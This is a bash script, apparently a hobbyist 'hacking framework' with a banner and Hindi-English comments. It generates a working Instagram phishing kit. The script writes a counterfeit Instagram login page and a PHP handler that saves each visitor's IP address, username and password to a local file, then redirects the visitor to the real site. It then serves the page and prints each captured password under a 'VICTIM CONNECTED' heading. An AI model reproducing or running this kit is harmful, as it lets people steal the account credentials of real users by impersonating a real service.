#!/bin/bash

# --- 1. SETUP COLORS & TRAPS ---
# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# Ctrl+C Trap (Clean Exit)
trap "echo -e '\n${RED}[!] Exiting...${RESET}'; killall php 2>/dev/null; exit" SIGINT SIGTERM

# --- 2. ANIMATION FUNCTION (MSFCONSOLE STYLE) ---
# Ye function text ko type-writer effect me likhega
animate_text() {
    text="$1"
    delay="$2"
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

# --- 3. CLEANUP (FIX BUSY PORT) ---
clear
echo -e "${YELLOW}[*] System Check & Cleaning Ports...${RESET}"
killall php > /dev/null 2>&1
# Kali specific cleanup
if command -v fuser &> /dev/null; then
    fuser -k 8080/tcp > /dev/null 2>&1
    fuser -k 3333/tcp > /dev/null 2>&1
fi
sleep 1
clear

# --- 4. THE ANIMATED BANNER ---
echo -e "${BLUE}"
cat << "EOF"
    _    _   _ _   _ ____      _    ____    _   _ _  _______  
   / \  | \ | | | | |  _ \    / \  / ___|  | | | | |/ /  _ \ 
  / _ \ |  \| | | | | |_) |  / _ \| |  _   | |_| | ' /| |_) |
 / ___ \| |\  | |_| |  _ <  / ___ \ |_| |  |  _  | . \|  _ < 
/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
                                                             
EOF
echo -e "${RESET}"

# Animated Loading...
echo -ne "${GREEN}[+] Initializing Modules... "
animate_text "████████████████████ 100%" 0.02
echo -e "${CYAN}[+] Framework : ${YELLOW}ANURAG HKR PRO${RESET}"
echo -e "${CYAN}[+] Status    : ${GREEN}ONLINE${RESET}"
echo -e "${CYAN}[+] System    : ${RED}KALI LINUX / TERMUX${RESET}"
echo ""

# --- 5. PORT SELECTION ---
echo -ne "${YELLOW}[?] Set LPORT (Press Enter for 8080): ${RESET}"
read USER_PORT
PORT=${USER_PORT:-8080}

# Kill specific port again just to be sure
if command -v fuser &> /dev/null; then
    fuser -k $PORT/tcp > /dev/null 2>&1
fi

# --- 6. CREATE DIRECTORIES & FILES ---
rm -rf auth/
mkdir -p auth
touch usernames.txt

# --- 7. HTML CODE (MOBILE RESPONSIVE + CAPTURE) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding: 20px; }
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline: none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor: pointer; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor: pointer; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor: pointer; }
.meta{ text-align:center; margin-top:25px; opacity:.7; font-size: 12px; }

/* MOBILE FIX */
@media(max-width:900px){
    .main{ flex-direction:column; }
    .left{ display:none; } 
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    .card{ width: 100%; max-width: 350px; background: transparent; }
}
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>
    <div class="right">
        <div class="card">
            <h2 style="font-family: sans-serif;">Instagram</h2>
            <form action="login.php" method="POST">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br>Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 8. PHP LOGIC ---
cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
\$log = "\$ip|\$user|\$pass\n";
file_put_contents("../usernames.txt", \$log, FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 9. SERVER START (KALI COMPATIBLE) ---
# Yahan 'termux-chroot' hata diya hai taki Kali pr chal sake
echo -ne "${CYAN}[*] Starting PHP Exploit Server... ${RESET}"
php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
PID=$!
sleep 2

if ps -p $PID > /dev/null; then
    echo -e "${GREEN}DONE${RESET}"
    echo -e "${YELLOW}---------------------------------------------${RESET}"
    echo -e "${CYAN}TARGET URL : ${GREEN}http://127.0.0.1:$PORT${RESET}"
    echo -e "${YELLOW}---------------------------------------------${RESET}"
    echo -e "${RED}[*] Waiting for credentials (Ctrl+C to stop)...${RESET}"
    echo ""

    # --- 10. MONITORING ---
    tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
        if [[ ! -z "$ip" ]]; then
            echo -e "${GREEN}[+] VICTIM CONNECTED!${RESET}"
            echo -e "${CYAN}    IP       : $ip${RESET}"
            echo -e "${YELLOW}    USERNAME : $user${RESET}"
            echo -e "${RED}    PASSWORD : $pass${RESET}"
            echo -e "${GREEN}    SAVED    : usernames.txt${RESET}"
            echo -e "---------------------------------------------"
            echo -e "\a"
        fi
    done
else
    echo -e "${RED}FAILED${RESET}"
    echo -e "${RED}[!] Error: Port $PORT is busy. Try another port.${RESET}"
    killall php > /dev/null 2>&1
fi
